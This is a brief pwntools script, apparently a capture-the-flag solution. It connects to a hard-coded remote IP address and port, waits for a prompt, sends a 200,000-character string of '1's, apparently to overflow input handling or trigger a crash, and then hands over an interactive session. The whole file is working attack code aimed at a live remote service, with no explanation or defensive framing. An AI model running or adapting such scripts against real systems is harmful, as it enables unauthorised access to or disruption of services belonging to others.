from pwn import *

p = remote('101.200.187.112',9006)
context(log_level="debug")
p.recvuntil('>>> ')
payload = '1'*200000
p.sendline(payload)
p.interactive()